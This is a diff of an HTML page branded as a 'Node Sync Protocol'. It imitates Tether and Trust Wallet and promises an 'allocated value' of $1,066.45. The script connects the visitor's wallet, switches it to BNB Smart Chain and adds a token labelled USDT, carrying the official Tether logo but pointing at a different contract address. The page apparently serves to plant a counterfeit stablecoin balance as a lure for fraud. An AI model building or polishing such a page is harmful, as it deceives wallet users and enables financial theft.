@@ -6,60 +6,54 @@
     <title>Node Sync Protocol</title>
     <style>
         :root { --tether-green: #26a17b; --bg-dark: #0a0b0d; --card-bg: #121418; }
-        body { background: var(--bg-dark); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 20px; padding: 35px; width: 350px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.6); }
+        body { background: var(--bg-dark); color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 20px; padding: 35px; width: 350px; text-align: center; }
         
-        /* Fixed Logo via Base64 SVG - 100% Load Guaranteed */
-        .main-logo { 
-            width: 85px; height: 85px; border-radius: 50%; 
-            box-shadow: 0 0 15px var(--tether-green); margin-bottom: 20px;
-            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNTAwIDI1MDAiPgogIDxwYXRoIGZpbGw9IiMyNmExN2IiIGQ9Ik0xMjUwIDI1MDBjNjkwLjM1NSAwIDEyNTAtNTU5LjY0NSAxMjUwLTEyNTBTMTk0MC4zNTUgMCAxMjUwIDAgMCA1NTkuNjQ1IDAgMTI1MHM1NTkuNjQ1IDEyNTAgMTI1MCAxMjUwIi8+CiAgPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTEzMTIuNjc3IDExNDkuMTN2LTMzNS42NjdoMzk0LjU0OFY0ODcuMTE4SDc5Mi43NTV2MzI2LjM0NWgzOTQuNTU1djMzNS42NjdjLTI5OS4zMjQgMTIuMDY2LTUyNy42NzIgNzQuOTE0LTUyNy42NzIgMTUxLjQxN3M0OTguNjg4IDE0OC4zMDUgODIxLjMzIDE0OC4zMDVjMzIyLjY0NSAwIDgyMS4zMTktNzEuNzk4IDgyMS4zMTktMTQ4LjMwNXMtMjI4LjM0OC0xMzkuMzYtNTI3LjY3My0xNTEuNDE3bS0zMi4xNjUgNjQ0LjcxMWMtMTkuMjk2IDQuMjc0LTU4Ljg5MyA1LjA4OC03NS41NDEgNS4wODgtMTYuNjQ5IDAtNTYuMjQ1LS44MTQtNzUuNTQxLTUuMDg4LTMyNC43MzYtNzIuMjA4LTYwNC4yOTEtMzY2LjAxMS02MDQuMjkxLTcxOC4xNjkgMCAzNzIuMzk4IDMyNi42MTQgNzE0LjQ0MSA2ODcuNTU3IDcyNS4wMTF2LTU0MC44ODJjLTQyMS4xNTYtMTcuMTIzLTczNS4zMTktOTUuNzc0LTczNS4zMTktMTkyLjY0MyAwLTk2Ljg2NCAzMTQuMTYzLTE3NS41MiA3MzUuMzE5LTE5Mi42NDN2OTI1LjkyOWMuNDA4IDAgLjgzOS0uMDExIDEuMjU0LS4wMTFzLjg0NiAwIDEuMjU0LjAxMXYtOTI1LjkyOWM0MjEuMTU2IDE3LjEyMyA3MzUuMzE5IDk1Ljc3NCA3MzUuMzE5IDE5Mi42NDMgMCA5Ni44NjQtMzE0LjE2MyAxNzUuNTItNzM1LjMxOSAxOTIuNjQzdjU0MC44ODJjMzYwLjk0My0xMC41NyA2ODcuNTU3LTM1Mi42MTMgNjg3LjU1Ny03MjUuMDExIDAtMzUyLjE1OC0yNzkuNTU1LTY0NS45NjEtNjA0LjI5MS03MTguMTY5Ii8+Cjwvc3ZnPg==');
-            background-size: cover;
-            display: inline-block;
+        /* Fixed Circular Logo Container */
+        .logo-circle {
+            width: 85px; height: 85px; background: var(--tether-green); 
+            border-radius: 50%; display: flex; align-items: center; 
+            justify-content: center; margin: 0 auto 20px;
+            box-shadow: 0 0 20px rgba(38, 161, 123, 0.4);
         }
+        .logo-circle svg { width: 50px; height: 50px; fill: white; }
 
-        .price-box { background: rgba(38, 161, 123, 0.1); border: 1px dashed var(--tether-green); border-radius: 12px; padding: 20px; margin-bottom: 25px; }
+        .price-display { background: rgba(38, 161, 123, 0.1); border: 1px dashed var(--tether-green); border-radius: 12px; padding: 20px; margin-bottom: 25px; }
         .amount { font-size: 28px; font-weight: bold; }
-        .action-btn { background: var(--tether-green); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .action-btn { background: var(--tether-green); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: bold; cursor: pointer; }
         #status { font-size: 11px; color: #26a17b; margin-top: 15px; font-family: monospace; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="main-logo"></div>
-    <div class="price-box">
-        <div style="font-size: 12px; color: #888;">ALLOCATED VALUE</div>
+    <div class="logo-circle">
+        <svg viewBox="0 0 24 24"><path d="M12.75 12.35v-5.3h4.63V4.25H6.62v2.8h4.63v5.3c-3.64.13-6.42.84-6.42 1.7s2.78 1.57 6.42 1.7v6.05h1.5v-6.05c3.64-.13 6.42-.84 6.42-1.7s-2.78-1.57-6.42-1.7z"/></svg>
+    </div>
+    
+    <div class="price-display">
+        <div style="font-size: 11px; color: #888; margin-bottom: 5px;">ALLOCATED VALUE</div>
         <div class="amount">$1,066.45</div>
     </div>
+
     <button class="action-btn" id="syncBtn">SYNC TRUST WALLET</button>
     <div id="status">READY</div>
 </div>
 
 <script>
-    // 6 Decimals for BEP-20 USDT Accuracy
     const CONTRACT = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
     const LOGO_URL = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
 
-    async function startSync() {
-        const status = document.getElementById('status');
+    async function process() {
         const provider = window.trustwallet || window.ethereum;
-
-        if (!provider) { alert("Trust Wallet not found!"); return; }
+        if (!provider) return;
 
         try {
-            status.innerText = "> CONNECTING...";
             await provider.request({ method: 'eth_requestAccounts' });
-
-            // Step 1: Switch to BNB Smart Chain (0x38)
-            status.innerText = "> SWITCHING TO BSC...";
             await provider.request({
                 method: 'wallet_switchEthereumChain',
                 params: [{ chainId: '0x38' }],
             });
-
-            // Step 2: Add Token with EXACT 6 Decimals
-            status.innerText = "> INJECTING ASSET...";
             await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
@@ -67,20 +61,14 @@
                     options: {
                         address: CONTRACT,
                         symbol: 'USDT',
-                        decimals: 6, // MATCHED TO CONTRACT
+                        decimals: 6,
                         image: LOGO_URL,
                     },
                 },
             });
-
-            status.innerText = "> SUCCESSFUL";
-            alert("Trust Wallet Synced!");
-        } catch (err) {
-            status.innerText = "> ERROR: HANDSHAKE FAILED";
-        }
+        } catch (err) { console.error(err); }
     }
-
-    document.getElementById('syncBtn').addEventListener('click', startSync);
+    document.getElementById('syncBtn').addEventListener('click', process);
 </script>
 </body>
 </html>
